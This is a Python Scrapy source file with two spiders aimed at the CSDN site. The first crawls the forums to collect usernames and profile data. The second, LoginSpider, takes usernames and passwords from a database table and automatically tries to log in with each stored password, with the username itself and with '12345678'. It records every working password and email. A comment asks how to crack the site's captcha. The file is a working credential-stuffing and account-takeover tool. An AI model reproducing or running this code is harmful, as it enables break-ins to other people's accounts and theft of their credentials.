#encoding=utf-8


__author__ = 'zym'
from csdn.item_loader import UserLoader
from csdn.items import UserItem
from csdn.items import LoginItem
from scrapy.spider import Spider
from scrapy.selector import Selector
from scrapy.http import Request, FormRequest
from scrapy import log
import re
import json
from DBHelper import OracleDB


def get_numbers(list):
    numbers=[]
    for elem in list:
        number=re.search(u'\d+',elem)
        if number:
            numbers.append(int(number.group()))
    return numbers

def printOut(object):
    print object

class CsdnSpider(Spider):
    name="csdn.allusers"
    allowed_domains=['csdn.net']
    start_urls=["http://bbs.csdn.net/home"]
    users={}
    #TODO:How to crack csdn validation code?
    def parse(self, response):
        requests=[]
        selector=Selector(response)
        xpath='//div[@class="categories"]//a/@href'
        urls=selector.xpath(xpath).extract()
        headers={'Referer':'http://bbs.csdn.net/home','Host':'bbs.csdn.net'}
        for url in urls:
             if url!=u'#':
                 r=Request(url="http://bbs.csdn.net"+url,callback=self.generate_forum_pages,headers=headers)
                 requests.append(r)
        #r=Request(url="http://bbs.csdn.net"+"/forums/CSharp",callback=self.generate_forum_pages)
        #requests.append(r)
        return requests

    def generate_forum_pages(self, response):
        requests=[]
        print "URL:%s" % response.url
        start_page,end_page=self.get_page_numbers(response,page_type="forum")
        for i in range(start_page,end_page+1):
            url=response.url+"?page="+str(i)
            r=Request(url=url,callback=self.parse_forum,dont_filter=True)
            requests.append(r)
        return requests

    def parse_forum(self,response):
        requests=[]
        print "URL:%s,status:%d" % (response.url,response.status)
        selector=Selector(response)
        topic_link_xpath='//div[@class="content"]/table//td[@class="title"]/a/@href'
        urls=selector.xpath(topic_link_xpath).extract()
        for url in urls:
             r=Request(url="http://bbs.csdn.net"+url,callback=self.generate_topic_pages)
             requests.append(r)
        return requests


    def generate_topic_pages(self,response):
        requests=[]
        start_page,end_page=self.get_page_numbers(response,page_type="topic")
        for i in range(start_page,end_page+1):
            url=response.url+"?page="+str(i)
            r=Request(url=url,callback=self.parse_topic,dont_filter=True,errback=self.error_handler)
            requests.append(r)
        return requests

    def parse_topic(self,response):
        requests=[]
        print "URL:%s,status:%d" % (response.url,response.status)
        selector=Selector(response)
        username_xpath='//dd[@class="username"]/a/text()'
        usernames=selector.xpath(username_xpath).extract()
        for i in range(len(usernames)):
            name=usernames[i]
            if name not in CsdnSpider.users:
                CsdnSpider.users[name]=True
                json_url="http://download.csdn.net/index.php/service/user_uploads_rss/get_user_info/"+name
                r=Request(url=json_url,callback=self.parse_user,meta={'username':name})
                requests.append(r)
        return requests

    def parse_user(self,response):
        user=response.meta
        json_str=response.body
        data=json.loads(json_str)
        print "user:%s\tcount:%d" % (user['username'],len(CsdnSpider.users))
        loader=UserLoader(UserItem())
        loader.add_value('userid',str(data.get('id',"0")))
        loader.add_value('username',user['username'])
        loader.add_value('rank',str(data.get('rank',"")))
        loader.add_value('score',str(data.get('score',"")))
        loader.add_value('regdate',data.get('regdate',""))
        loader.add_value('downloadcount',str(data.get('downloadcount',"")))
        loader.add_value('uploadcount',str(data.get('uploadcount',"")))
        loader.add_value('grade',str(data.get('grade',"")))
        return loader.load_item()

    def get_page_numbers(self,response,page_type):
        start_page=1
        end_page=1
        selector=Selector(response)
        if page_type=="forum":
            xpath_last='//div[@class="page_nav"][1]/ul//li//span[2]//text()'
            last_page_content=selector.xpath(xpath_last).extract()
            if len(last_page_content)>0:
                end_page=int(re.search(u'\d+',last_page_content[0]).group())
        elif page_type=="topic":
            xpath_all='//div[@class="page_nav"][1]/ul//li//a/text()'
            page_numbers=get_numbers(selector.xpath(xpath_all).extract())
            if len(page_numbers)>0:
                end_page=max(page_numbers)
        return start_page,end_page

    def error_handler(self,response):
        print "%s" % "error handler"


class LoginSpider(Spider):
    name="csdn.login"
    allowed_domains=['csdn.net']
    start_urls=["https://passport.csdn.net/account/login"]
    oracle_db=OracleDB()

    def __init__(self,id_from=0,id_to=0):
        self.users=[]
        self.id_from=id_from
        self.id_to=id_to
        LoginSpider.oracle_db.connect('edgar','edgar','PROXY')
        #self.passwords=['123456789','12345678','11111111','dearbook','aaaaaaaa']

    def parse(self, response):
        requests=[]
        sql='select username,password from t_csdn_users where id>:id_from and id<=:id_to and real_password is null'
        param={'id_from':self.id_from,'id_to':self.id_to}
        log.msg(self.id_from,self.id_to,level=log.INFO)
        self.users=LoginSpider.oracle_db.execute_sql(sql=sql,params=param)
        header={'Referer':'https://passport.csdn.net/account/loginbox?callback=logined&hidethird=1&from=http%3a%2f%2fbbs.csdn.net%2fhome','Host':'passport.csdn.net'}
        for user in self.users:
            username=user[0]
            for password in [user[0],user[1],'12345678']:
                meta={'username':username,'password':password}
                url='https://passport.csdn.net/ajax/accounthandler.ashx?t=log&u='+str(username)+'&p='+str(password)
                yield Request(url=url,callback=self.after_login,headers=header,meta=meta,errback=self.error_handler)
                #requests.append(r)
            #for password in self.passwords:
            #    username=user[0]
            #    meta={'username':username,'password':password}
            #    url='https://passport.csdn.net/ajax/accounthandler.ashx?t=log&u='+str(username)+'&p='+str(password)
            #    r=Request(url=url,callback=self.after_login,headers=header,meta=meta,errback=self.error_handler)
            #    requests.append(r)
        #return requests

    def after_login(self,response):
        json_msg=json.loads(response.body)
        username=response.meta['username']
        password=response.meta['password']
        status=json_msg['status']
        #print "username:%s\n" % username
        if status:
            item=LoginItem()
            data=json_msg['data']
            email=data['email']
            item['email']=email
            item['username']=username
            item['password']=password
            return item
        return

    def error_handler(self,response):
        print "error:%s" % "too many times"
        return